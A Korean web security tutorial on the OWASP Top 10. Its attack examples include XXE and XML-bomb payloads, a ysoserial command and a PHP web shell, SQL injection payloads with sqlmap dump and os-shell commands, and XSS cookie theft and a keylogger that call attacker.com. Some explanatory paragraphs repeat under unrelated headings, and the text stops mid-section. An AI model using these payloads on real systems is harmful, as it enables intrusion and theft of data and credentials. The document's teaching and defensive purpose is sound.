# OWASP Top 10 — 웹 취약점 완전 정복

## OWASP 자동화 위협 분류 (Automated Threat Handbook)

OWASP는 웹 애플리케이션에 대한 자동화 위협을 21개 OAT(Ontology of Automated Threats)로 분류합니다.

```
자동화 위협 목록 (주요 항목):
OAT-001 Carding          — 카드 번호 유효성 일괄 검증
OAT-002 Token Cracking   — 인증 토큰 무차별 대입
OAT-003 Ad Fraud         — 광고 클릭 사기
OAT-004 Fingerprinting   — 소프트웨어 지문 수집
OAT-005 Scalping         — 한정 상품 자동 구매 선점
OAT-006 Expediting       — 거래 빠른 처리 유도
OAT-007 Credential Cracking — 계정 자격증명 무차별 대입
OAT-008 Credential Stuffing — 유출 자격증명 목록으로 로그인 시도
OAT-009 CAPTCHA Defeat   — 자동화로 CAPTCHA 풀기
OAT-010 Card Cracking    — 카드 CVV/만료일 무차별 대입
OAT-011 Scraping         — 콘텐츠 자동 수집
OAT-012 Cashing Out      — 훔친 결제 수단 현금화
OAT-013 Sniping          — 경매 막바지 자동 입찰
OAT-014 Vulnerability Scanning — 취약점 자동 스캐닝
OAT-015 Denial of Service — 서비스 거부
OAT-016 Skewing          — 통계/평점 조작
OAT-017 Spamming         — 스팸 콘텐츠 자동 생성
OAT-018 Footprinting     — 앱 구조 자동 탐색/매핑
OAT-019 Account Creation — 가짜 계정 대량 생성
OAT-020 Account Aggregation — 여러 계정 데이터 통합
OAT-021 Denial of Inventory — 재고 선점으로 구매 방해 (v1.2 신규)
```

### 자동화 위협 대응 전략

자동화 위협(봇 공격)에 대응하기 위한 다계층 방어 전략입니다. Rate Limiting으로 요청 빈도를 제한하고, CAPTCHA와 디바이스 핑거프린팅을 조합하며, 봇 관리 솔루션(Cloudflare, AWS WAF)으로 알려진 봇 IP를 차단합니다.

```
탐지 레이어:
  - 행동 분석 (요청 빈도, 패턴)
  - 디바이스 핑거프린팅
  - JavaScript 챌린지
  - CAPTCHA (단, OAT-009로 우회 가능)

방어 레이어:
  - Rate Limiting (IP/사용자/엔드포인트별)
  - CAPTCHA (고급 — reCAPTCHA v3, hCaptcha)
  - 봇 관리 솔루션 (Cloudflare Bot Management, AWS WAF)
  - 행동 기반 탐지 (마우스 움직임, 클릭 패턴)
  - IP 평판 데이터베이스 연동
```

---

## OWASP Top 10 (2021) 개요

| 순위 | 취약점 | 위험도 |
|------|--------|--------|
| A01 | Broken Access Control (접근 제어 실패) | 매우 높음 |
| A02 | Cryptographic Failures (암호화 실패) | 높음 |
| A03 | Injection (인젝션) | 높음 |
| A04 | Insecure Design (안전하지 않은 설계) | 높음 |
| A05 | Security Misconfiguration (보안 설정 오류) | 높음 |
| A06 | Vulnerable Components (취약한 구성 요소) | 중간 |
| A07 | Authentication Failures (인증 실패) | 높음 |
| A08 | Software and Data Integrity Failures | 높음 |
| A09 | Logging Failures (로깅 실패) | 중간 |
| A10 | SSRF (서버측 요청 위조) | 중간 |

---

## OWASP Top 10 (2017) — 이전 버전 비교

| 순위 | 취약점 | 위험 점수 |
|------|--------|-----------|
| A1:2017 | Injection | 8.0 |
| A2:2017 | Broken Authentication | 7.0 |
| A3:2017 | Sensitive Data Exposure | 7.0 |
| A4:2017 | XML External Entities (XXE) | 7.0 |
| A5:2017 | Broken Access Control | 6.0 |
| A6:2017 | Security Misconfiguration | 6.0 |
| A7:2017 | Cross-Site Scripting (XSS) | 6.0 |
| A8:2017 | Insecure Deserialization | 5.0 |
| A9:2017 | Using Components with Known Vulnerabilities | 4.7 |
| A10:2017 | Insufficient Logging & Monitoring | 4.0 |

### 2013→2017 주요 변경 사항
```
신규 추가:
  A4:2017 - XML External Entities (XXE) — SAST 도구 데이터 기반
  A8:2017 - Insecure Deserialization    — 커뮤니티 투표
  A10:2017 - Insufficient Logging & Monitoring — 커뮤니티 투표

병합:
  A4(IDOR) + A7(Function Level Access Control) → A5:2017 Broken Access Control

삭제:
  A8-CSRF (5%에만 발견, 프레임워크가 대부분 방어)
  A10-Unvalidated Redirects and Forwards (XXE에 밀려 제외)
```

### OWASP 위험도 평가 방식
```
위험 점수 = (공격 용이성 + 탐지 난이도) / 2 × 기술적 영향

예: A6 Security Misconfiguration
  공격 용이성: 3 (쉬움)
  보편성:      3 (광범위)
  탐지 난이도: 3 (쉬움)
  기술적 영향: 2 (보통)
  → 평균 3.0 × 2 = 6.0점
```

---

## A3:2017 Sensitive Data Exposure (민감 데이터 노출)

### 주요 공격 시나리오
```
1. 평문 HTTP 전송
   로그인 폼이 HTTP로 전송 → 중간자 공격으로 자격증명 탈취

2. 약한 암호화 알고리즘 사용
   MD5/SHA-1로 비밀번호 해싱 → 레인보우 테이블 공격으로 복원

3. 암호화 없는 데이터 저장
   신용카드 번호, 주민번호를 평문으로 DB 저장

4. 불필요한 데이터 수집/보관
   GDPR/PCI DSS 위반: 필요 이상의 개인정보 저장
```

### 안전한 비밀번호 해싱 알고리즘

bcrypt, Argon2 등 안전한 패스워드 해싱 알고리즘을 Python으로 구현합니다. MD5/SHA 같은 일반 해시 대신 반드시 단방향 패스워드 해시를 사용해야 합니다.

```python
#!/usr/bin/env python3
"""
비밀번호 해싱 알고리즘 비교 및 검증 도구
사용법: python3 pw_hash.py --hash argon2 --password "MyP@ss123"
"""
import argparse
import hashlib
import os
import time
from typing import Callable


# ── 나쁜 방법 (절대 사용 금지) ──────────────────────────────────────────────
def bad_md5(password: str) -> str:
    return hashlib.md5(password.encode()).hexdigest()  # 레인보우 테이블로 즉시 복원


def bad_sha256_no_salt(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()  # 솔트 없으면 사전 공격 취약


# ── 좋은 방법 ─────────────────────────────────────────────────────────────────
def good_argon2(password: str) -> str:
    """Argon2id — 2015 PHC 우승, NIST SP 800-63B 권장"""
    from argon2 import PasswordHasher, Type
    ph = PasswordHasher(
        time_cost=3,           # 반복 횟수 (최소 3)
        memory_cost=65536,     # 메모리 64MB
        parallelism=2,         # 병렬성 2
        hash_len=32,
        type=Type.ID,          # Argon2id (side-channel 저항)
    )
    return ph.hash(password)


def good_bcrypt(password: str) -> bytes:
    """bcrypt — cost factor 12 이상 권장"""
    import bcrypt
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode("utf-8"), salt)


def good_pbkdf2(password: str) -> str:
    """PBKDF2-HMAC-SHA256 — Python 내장, NIST 승인"""
    salt = os.urandom(32)
    key = hashlib.pbkdf2_hmac(
        "sha256",
        password.encode("utf-8"),
        salt,
        iterations=600_000,    # OWASP 2023 권장: 600,000회
    )
    return salt.hex() + ":" + key.hex()


def good_scrypt(password: str) -> str:
    """scrypt — 메모리 집약적, GPU 공격에 강함"""
    salt = os.urandom(32)
    key = hashlib.scrypt(
        password.encode("utf-8"),
        salt=salt,
        n=2**17,    # 메모리 파라미터 (최소 2^14)
        r=8,
        p=1,
        dklen=32,
    )
    return salt.hex() + ":" + key.hex()


def benchmark(name: str, fn: Callable, password: str) -> None:
    start = time.perf_counter()
    result = fn(password)
    elapsed = time.perf_counter() - start
    truncated = str(result)[:40] + "..."
    print(f"  [{name:<20}] {elapsed*1000:6.1f}ms  → {truncated}")


def main() -> None:
    parser = argparse.ArgumentParser(description="비밀번호 해싱 비교 도구")
    parser.add_argument("--password", default="P@ssw0rd!2024",
                        help="테스트할 비밀번호")
    parser.add_argument("--benchmark", action="store_true",
                        help="속도 벤치마크 실행")
    args = parser.parse_args()

    pw = args.password
    print(f"[*] 비밀번호: {pw}\n")
    print("[나쁜 예시 (공격 대상)]")
    benchmark("MD5 (위험)", bad_md5, pw)
    benchmark("SHA256 no-salt (위험)", bad_sha256_no_salt, pw)

    print("\n[권장 알고리즘]")
    benchmark("Argon2id", good_argon2, pw)
    benchmark("bcrypt (cost=12)", good_bcrypt, pw)
    benchmark("PBKDF2 (600k)", good_pbkdf2, pw)
    benchmark("scrypt (n=2^17)", good_scrypt, pw)


if __name__ == "__main__":
    main()
```

### TLS 설정 점검

TLS 버전과 암호 스위트를 점검합니다. TLS 1.0/1.1과 취약한 암호화 알고리즘(RC4, DES)이 비활성화되어 있는지 확인합니다.

```bash
# TLS 버전 및 암호 스위트 점검
nmap --script ssl-enum-ciphers -p 443 target.com

# SSL Labs 점검 (A+ 등급 목표)
# https://www.ssllabs.com/ssltest/

# 안전하지 않은 프로토콜 비활성화 (nginx 예시)
ssl_protocols TLSv1.2 TLSv1.3;  # TLS 1.0, 1.1 비활성화
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
ssl_prefer_server_ciphers off;

# HSTS (HTTP Strict Transport Security)
add_header Strict-Transport-Security "max-age=63072000" always;
```

---

## A4:2017 XXE (XML External Entities)

### XXE 공격 원리

XXE(XML External Entity) 취약점은 XML 파서가 외부 엔티티를 처리할 때 발생합니다. `<!ENTITY xxe SYSTEM 'file:///etc/passwd'>`처럼 파일 읽기나 SSRF 공격에 활용됩니다. 외부 엔티티 처리를 비활성화하여 방어합니다.

```xml
<!-- 정상 XML -->
<user><name>admin</name></user>

<!-- XXE 공격: 외부 엔티티 선언으로 파일 읽기 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
<!-- 서버가 /etc/passwd 내용을 name 필드에 삽입하여 응답 -->
```

### Billion Laughs (DoS 공격)

XML Billion Laughs 공격(XML 폭탄)입니다. 중첩된 엔티티 참조로 메모리를 기하급수적으로 소진시켜 DoS를 유발합니다.

```xml
<!-- XML 폭탄 — 메모리 소진 DoS -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
<!-- lol5 = 10^5 = 100,000개 "lol" → 수백MB 메모리 사용 -->
```

### SAML XXE (인증 우회)

XXE(XML External Entity) 취약점은 XML 파서가 외부 엔티티를 처리할 때 발생합니다. `<!ENTITY xxe SYSTEM 'file:///etc/passwd'>`처럼 파일 읽기나 SSRF 공격에 활용됩니다. 외부 엔티티 처리를 비활성화하여 방어합니다.

```
SAML Response (Base64 인코딩된 XML)를 디코딩 후 XXE 삽입
→ SSO 인증 과정에서 XXE 실행
→ 내부 파일 읽기 또는 SSRF

공격 흐름:
1. 정상 SAML 응답 캡처 (Burp Suite)
2. Base64 디코딩
3. XXE 페이로드 삽입
4. 다시 Base64 인코딩
5. 변조된 SAML 응답 전송
```

### XXE 방어

XXE(XML External Entity) 취약점은 XML 파서가 외부 엔티티를 처리할 때 발생합니다. `<!ENTITY xxe SYSTEM 'file:///etc/passwd'>`처럼 파일 읽기나 SSRF 공격에 활용됩니다. 외부 엔티티 처리를 비활성화하여 방어합니다.

```java
// Java: DocumentBuilderFactory 설정 (XXE 비활성화)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// Python lxml
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)

// 최선의 방어: XML 대신 JSON 사용
// XML 파서를 사용해야 한다면 DTD 처리 완전 비활성화
```

---

## A8:2017 Insecure Deserialization (안전하지 않은 역직렬화)

### 역직렬화 공격 원리
```
직렬화: 객체 → 바이트스트림 (저장/전송용)
역직렬화: 바이트스트림 → 객체 (복원)

공격: 조작된 직렬화 데이터를 서버에 전송
     → 역직렬화 시 임의 코드 실행 (RCE)
```

### Java 역직렬화 공격

Java 역직렬화 취약점이 있는 코드 패턴입니다. 신뢰할 수 없는 입력을 ObjectInputStream으로 역직렬화하면 임의 코드가 실행될 수 있습니다.

```java
// 취약한 코드: 신뢰할 수 없는 입력을 역직렬화
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();  // 위험!

// 악성 직렬화 데이터 생성 (ysoserial 도구)
// java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.ser
// → 역직렬화 시 calc.exe 실행
```

ysoserial 도구로 Java 역직렬화 RCE 페이로드를 생성합니다. Commons Collections 등 취약한 가젯 체인을 이용한 공격입니다.

```bash
# ysoserial로 RCE 페이로드 생성
java -jar ysoserial.jar CommonsCollections4 "curl attacker.com/`whoami`" | base64

# 취약한 Java 앱에 전송
curl -X POST http://target.com/api/object \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser
```

### PHP 역직렬화 공격

PHP unserialize() 취약점 코드입니다. 마법 메서드(__destruct, __wakeup)를 이용한 객체 인젝션으로 임의 코드를 실행할 수 있습니다.

```php
// 취약한 코드
$data = unserialize($_COOKIE['user_data']);  // 위험!

// 공격: __wakeup()/__destruct() 매직 메서드 악용
class Logger {
    public $filename;
    public $data;
    
    function __destruct() {
        file_put_contents($this->filename, $this->data);
    }
}

// 악성 객체 직렬화
$obj = new Logger();
$obj->filename = '/var/www/html/shell.php';
$obj->data = '<?php system($_GET["cmd"]); ?>';
echo serialize($obj);
// → O:6:"Logger":2:{s:8:"filename";s:30:"/var/www/html/shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}
```

### 방어 방법
```
1. 신뢰할 수 없는 소스의 직렬화 데이터 역직렬화 금지
2. 디지털 서명으로 직렬화 데이터 무결성 검증
   - HMAC 서명: 서버만 아는 비밀키로 서명 → 변조 탐지
3. Java: 안전한 역직렬화 라이브러리 사용
   - SerialKiller: 화이트리스트 기반 클래스 필터
   - NotSoSerial: 에이전트 기반 보호
4. 가능하면 JSON/XML 같은 텍스트 형식 사용
5. 역직렬화 작업을 최소 권한 샌드박스에서 실행
```

---

## A10:2017 Insufficient Logging & Monitoring (불충분한 로깅/모니터링)

### 현실 통계
```
- 평균 침해 탐지 시간: 200일 (IBM 보안 보고서)
- 외부에 의해 침해 발견: 약 2/3 (자체 탐지 실패)
- 랜섬웨어: 평균 80일간 내부에서 잠복 후 발동
```

### 반드시 로깅해야 할 이벤트
```
인증 관련:
  - 로그인 성공/실패 (IP, 타임스탬프, 사용자명)
  - 비밀번호 재설정 시도
  - 계정 잠금
  - 세션 생성/종료

접근 제어:
  - 권한 없는 리소스 접근 시도
  - 관리자 기능 접근
  - 대량 데이터 다운로드

입력 검증:
  - SQL Injection 시도 패턴
  - XSS 페이로드 탐지
  - 파일 경로 탐색 시도
```

### SIEM 연동 로깅 구현

보안 이벤트를 SIEM 시스템에 전송하는 로깅 구현입니다. 구조화된 로그 형식으로 공격 탐지와 사고 대응을 용이하게 합니다.

```python
#!/usr/bin/env python3
"""
구조화된 보안 이벤트 로거 — JSON 형식, ELK/SIEM 연동 지원
사용법: python3 sec_logger.py (모듈로 import 후 사용)
"""
import json
import logging
import logging.handlers
import os
import sys
from datetime import datetime, timezone
from dataclasses import dataclass, field, asdict
from typing import Any


# ── 이벤트 타입 상수 ──────────────────────────────────────────────────────────
class EventType:
    AUTH_SUCCESS     = "AUTH_SUCCESS"
    AUTH_FAILURE     = "AUTH_FAILURE"
    ACCOUNT_LOCKED   = "ACCOUNT_LOCKED"
    PRIVESC_ATTEMPT  = "PRIVESC_ATTEMPT"
    SQL_INJECTION    = "SQL_INJECTION"
    XSS_ATTEMPT      = "XSS_ATTEMPT"
    PATH_TRAVERSAL   = "PATH_TRAVERSAL"
    BRUTE_FORCE      = "BRUTE_FORCE"
    MASS_DOWNLOAD    = "MASS_DOWNLOAD"
    ADMIN_ACCESS     = "ADMIN_ACCESS"


@dataclass
class SecurityEvent:
    event_type: str
    severity: str                          # CRITICAL / HIGH / MEDIUM / LOW / INFO
    user: str = "anonymous"
    source_ip: str = "0.0.0.0"
    endpoint: str = ""
    details: dict[str, Any] = field(default_factory=dict)
    timestamp: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )
    host: str = field(default_factory=lambda: os.uname().nodename)

    def to_json(self) -> str:
        return json.dumps(asdict(self), ensure_ascii=False)


class SecurityLogger:
    """구조화된 보안 로거 (파일 + 콘솔 동시 출력, 자동 로테이션)"""

    def __init__(
        self,
        log_file: str = "/var/log/security.json",
        max_bytes: int = 50 * 1024 * 1024,  # 50MB
        backup_count: int = 10,
    ) -> None:
        self._logger = logging.getLogger("security")
        self._logger.setLevel(logging.DEBUG)
        self._logger.propagate = False

        # 파일 핸들러 (로테이션)
        try:
            fh = logging.handlers.RotatingFileHandler(
                log_file, maxBytes=max_bytes, backupCount=backup_count
            )
            fh.setFormatter(logging.Formatter("%(message)s"))
            self._logger.addHandler(fh)
        except PermissionError:
            pass  # 권한 없으면 파일 핸들러 생략

        # 콘솔 핸들러
        ch = logging.StreamHandler(sys.stdout)
        ch.setFormatter(logging.Formatter("%(message)s"))
        self._logger.addHandler(ch)

        # 임계값 기반 경보 (브루트포스 탐지)
        self._fail_counter: dict[str, int] = {}

    def log(self, event: SecurityEvent) -> None:
        level_map = {
            "CRITICAL": logging.CRITICAL,
            "HIGH":     logging.ERROR,
            "MEDIUM":   logging.WARNING,
            "LOW":      logging.INFO,
            "INFO":     logging.INFO,
        }
        level = level_map.get(event.severity, logging.INFO)
        self._logger.log(level, event.to_json())
        self._check_brute_force(event)

    def _check_brute_force(self, event: SecurityEvent) -> None:
        if event.event_type != EventType.AUTH_FAILURE:
            return
        key = f"{event.source_ip}:{event.user}"
        self._fail_counter[key] = self._fail_counter.get(key, 0) + 1
        if self._fail_counter[key] >= 5:
            alert = SecurityEvent(
                event_type=EventType.BRUTE_FORCE,
                severity="HIGH",
                user=event.user,
                source_ip=event.source_ip,
                details={"fail_count": self._fail_counter[key]},
            )
            self._logger.error(alert.to_json())


# 싱글톤 인스턴스
_logger_instance: SecurityLogger | None = None


def get_logger() -> SecurityLogger:
    global _logger_instance
    if _logger_instance is None:
        _logger_instance = SecurityLogger()
    return _logger_instance


# ── 사용 예시 ─────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    logger = get_logger()

    # 인증 실패 5회 → 브루트포스 경보 자동 발생
    for i in range(6):
        logger.log(SecurityEvent(
            event_type=EventType.AUTH_FAILURE,
            severity="MEDIUM",
            user="admin",
            source_ip="192.168.1.100",
            endpoint="/api/login",
            details={"attempt": i + 1, "reason": "invalid_password"},
        ))

    # SQL Injection 탐지
    logger.log(SecurityEvent(
        event_type=EventType.SQL_INJECTION,
        severity="CRITICAL",
        user="anonymous",
        source_ip="10.0.0.1",
        endpoint="/api/users",
        details={"payload": "' OR 1=1--", "param": "id"},
    ))

    # 관리자 접근 성공 로그
    logger.log(SecurityEvent(
        event_type=EventType.ADMIN_ACCESS,
        severity="HIGH",
        user="admin",
        source_ip="203.0.113.1",
        endpoint="/admin/dashboard",
        details={"method": "GET", "user_agent": "curl/8.2"},
    ))
```

### 1-10-60 탐지 규칙 (CrowdStrike 기준)
```
1분 내: 침해 탐지
10분 내: 침해 조사
60분 내: 격리 및 차단

현실 평균:
  탐지: 수십~수백 일
  조사: 수 일
  대응: 수 일~수 주
```

---

## OWASP Top 10 위험도 평가 방법론 (OWASP 공식 문서)

```
위험 점수 산출 공식:
  위험 점수 = 위협 가능성 × 영향도

위협 가능성 구성:
  - 공격 용이성 (Exploitability): 쉬움(3) / 보통(2) / 어려움(1)
  - 보편성 (Prevalence): 광범위(3) / 보통(2) / 드뭄(1)
  - 탐지 난이도 (Detectability): 쉬움(3) / 보통(2) / 어려움(1)

기술적 영향도 (Technical Impact):
  - 심각(3) / 보통(2) / 경미(1)

OWASP 기준 데이터:
  - 40개 이상의 보안 회사 데이터 기반
  - 100,000개 이상의 실제 애플리케이션/API 분석
  - 500명 이상의 업계 전문가 설문 결과

CWE 연계:
  OWASP Top 10 항목은 CWE(Common Weakness Enumeration)에 매핑
  → 일관된 취약점 명명 체계 제공
```

### OWASP 위험 평가 실전 적용
```
조직별 맞춤 위험 평가:
  1. 위협 행위자 파악 (내부자/외부 해커/국가 지원 해커)
  2. 기술적 영향 × 비즈니스 영향 계산
  3. PCI DSS, GDPR 등 규정 준수 고려
  4. 산업별 특성 반영 (의료/금융/공공)

ASVS (Application Security Verification Standard):
  - OWASP의 상세 검증 표준 (Level 1~3)
  - Level 1: 자동화 테스트로 확인 가능한 항목
  - Level 2: 일반적인 보안 요구사항
  - Level 3: 고보안 환경 (뱅킹, 의료)
```

---

## A03: SQL Injection (가장 치명적)

### 원리
```
정상 쿼리:
SELECT * FROM users WHERE id='admin' AND pw='password'

공격 (admin' --)
SELECT * FROM users WHERE id='admin' --' AND pw='...'
                                      ↑ 주석으로 뒤를 무효화 → 비밀번호 우회
```

### 기본 SQL Injection 페이로드

SQL 인젝션은 사용자 입력 값이 SQL 쿼리에 직접 삽입될 때 쿼리 구조를 변조하여 데이터베이스를 공격하는 기법입니다. `sqlmap`은 이를 자동화하여 DB 종류 탐지부터 데이터 덤프까지 원클릭으로 수행합니다.

```sql
-- 인증 우회
' OR '1'='1
' OR 1=1--
admin'--
' OR 'a'='a

-- 에러 기반 (데이터 추출)
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--

-- UNION 기반 (컬럼 수 확인)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 5--  ← 오류 발생 시 컬럼 수 = 4

-- UNION으로 데이터 추출
' UNION SELECT NULL, NULL, NULL--           (컬럼 수 맞추기)
' UNION SELECT 1, 'text', NULL--
' UNION SELECT 1, table_name, NULL FROM information_schema.tables--
' UNION SELECT 1, column_name, NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1, username, password FROM users--
```

### Blind SQL Injection

SQL 인젝션은 사용자 입력 값이 SQL 쿼리에 직접 삽입될 때 쿼리 구조를 변조하여 데이터베이스를 공격하는 기법입니다. `sqlmap`은 이를 자동화하여 DB 종류 탐지부터 데이터 덤프까지 원클릭으로 수행합니다.

```sql
-- Boolean-based (참/거짓으로 데이터 추출)
-- 조건이 참이면 정상 페이지, 거짓이면 다른 결과

' AND 1=1--          ← 정상 (참)
' AND 1=2--          ← 비정상 (거짓)

-- 첫 번째 문자가 'a'인지 확인
' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1))>97--

-- Time-based (응답 시간으로 추출)
' AND SLEEP(5)--            (MySQL)
' WAITFOR DELAY '0:0:5'--   (MSSQL)
'; SELECT pg_sleep(5)--     (PostgreSQL)

-- 조건부 시간 지연
' AND IF(1=1, SLEEP(5), 0)--
' AND IF((SELECT COUNT(*) FROM users WHERE username='admin')=1, SLEEP(5), 0)--
```

### SQLMap 자동화

SQLMap으로 SQL 인젝션 취약점을 자동으로 탐지하고 익스플로잇합니다. --dbs, --tables, --dump 옵션으로 데이터베이스 내용을 추출할 수 있습니다.

```bash
# 기본 사용법
sqlmap -u "http://target.com/page.php?id=1"

# POST 파라미터
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# 쿠키 인증
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc123"

# 데이터베이스 열거
sqlmap -u "http://target.com/?id=1" --dbs          # DB 목록
sqlmap -u "http://target.com/?id=1" -D mydb --tables  # 테이블 목록
sqlmap -u "http://target.com/?id=1" -D mydb -T users --columns  # 컬럼
sqlmap -u "http://target.com/?id=1" -D mydb -T users --dump     # 데이터 추출

# OS 쉘 시도
sqlmap -u "http://target.com/?id=1" --os-shell

# 파일 읽기 (MySQL FILE 권한 필요)
sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"

# 속도 및 스텔스 옵션
sqlmap -u "http://target.com/?id=1" --level=5 --risk=3 --delay=1
sqlmap -u "http://target.com/?id=1" --random-agent  # User-Agent 랜덤화
```

### SQL Injection 방어

SQL 인젝션은 사용자 입력 값이 SQL 쿼리에 직접 삽입될 때 쿼리 구조를 변조하여 데이터베이스를 공격하는 기법입니다. `sqlmap`은 이를 자동화하여 DB 종류 탐지부터 데이터 덤프까지 원클릭으로 수행합니다.

```php
// PDO Prepared Statement (가장 안전)
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ? AND pw = ?');
$stmt->execute([$id, $pw]);

// MySQLi Prepared Statement
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();

// 입력값 검증 (추가 방어)
$id = filter_input(INPUT_GET, 'id', FILTER_SANITIZE_STRING);
$id = intval($id);  // 숫자만 허용
```

---

## A03: XSS (Cross-Site Scripting)

### XSS 종류

#### 1. Reflected XSS (반사형)

XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```
공격자가 악성 링크를 피해자에게 전달
피해자 클릭 → 서버에서 입력값 그대로 반영 → 브라우저에서 실행

URL: http://target.com/search?q=<script>alert('XSS')</script>

서버 응답:
<div>검색결과: <script>alert('XSS')</script></div>
```

#### 2. Stored XSS (저장형, 더 위험)

XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```
공격자가 악성 스크립트를 DB에 저장
다른 사용자가 해당 페이지 방문 시 자동 실행

예: 게시판 글쓰기
내용: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

#### 3. DOM-based XSS

XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```
서버 응답 없이 JavaScript로만 처리되는 XSS
개발자 도구로만 탐지 가능 (서버 로그에 안 남음)

취약 코드:
document.getElementById('output').innerHTML = location.hash.slice(1);

공격: http://target.com/page.html#<img src=x onerror=alert(1)>
```

### XSS 페이로드 모음

XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```javascript
// 기본 테스트
<script>alert('XSS')</script>

// 필터 우회 (대소문자)
<SCRIPT>alert('XSS')</SCRIPT>
<ScRiPt>alert('XSS')</ScRiPt>

// 이벤트 핸들러
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<svg onload=alert('XSS')>

// JavaScript 프로토콜
<a href="javascript:alert('XSS')">click</a>

// 스크립트 태그 없는 방법
<iframe src="javascript:alert('XSS')"></iframe>

// 쿠키 탈취
<script>
  document.location='http://attacker.com/steal.php?c='+document.cookie;
</script>

// 키로거
<script>
  document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/log?k=' + e.key;
  };
</script>

// 필터 우회 (인코딩)
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval(atob('YWxlcnQoMSk='))</script>  // base64
```

### XSS 방어

XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```php
// PHP에서 출력 시 HTML 엔티티 인코딩
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
echo htmlentities($user_input, ENT_QUOTES, 'UTF-8');

// JavaScript 컨텍스트에 삽입 시
echo json_encode($user_input);
```

JavaScript에서 DOM 조작 시 XSS를 방어하는 안전한 코드입니다. innerHTML 대신 textContent나 createElement를 사용하여 스크립트 인젝션을 차단합니다.

```javascript
// JavaScript에서 DOM 조작 시
element.textContent = userInput;    // 안전 (HTML 해석 안 함)
// 위험:
element.innerHTML = userInput;      // XSS 가능!
```
```
// CSP (Content Security Policy) 헤더
Content-Security-Policy: script-src 'self'; object-src 'none';
```

---

## A01: Broken Access Control

### IDOR (Insecure Direct Object Reference)
```
취약 예시:
https://target.com/api/user/1234/profile  ← 내 프로필
https://target.com/api/user/1235/profile  ← 다른 사용자 프로필 (그냥 접근 가능!)

공격:
1. ID 1234 → 1235로 변경 (순차적 열거)
2. UUID로 돼있어도 다른 사용자 UUID 시도

방어:
- 서버에서 세션의 사용자 ID와 요청 자원의 소유자 비교
- 간접 참조 맵 사용 (내부 ID를 외부에 노출하지 않음)
```

### 파일 경로 탐색 (Path Traversal)
```
공격 예시:
https://target.com/file?name=../../../etc/passwd
https://target.com/file?name=....//....//etc/passwd (인코딩 우회)
https://target.com/file?name=%2e%2e%2f%2e%2e%2fetc%2fpasswd (URL 인코딩)

Windows:
https://target.com/file?name=..\..\..\..\windows\system32\drivers\etc\hosts

방어:
$filename = basename($filename);  // 경로 제거
$safe_path = realpath('/uploads/' . $filename);
if (!str_starts_with($safe_path, '/uploads/')) { die('Invalid'); }
```

---

## A07: Authentication Failures

### 세션 하이재킹
```
세션 쿠키 탈취 방법:
1. XSS로 document.cookie 탈취
2. 네트워크 스니핑 (HTTP 평문 전송)
3. 브라우저 히스토리/캐시

방어:
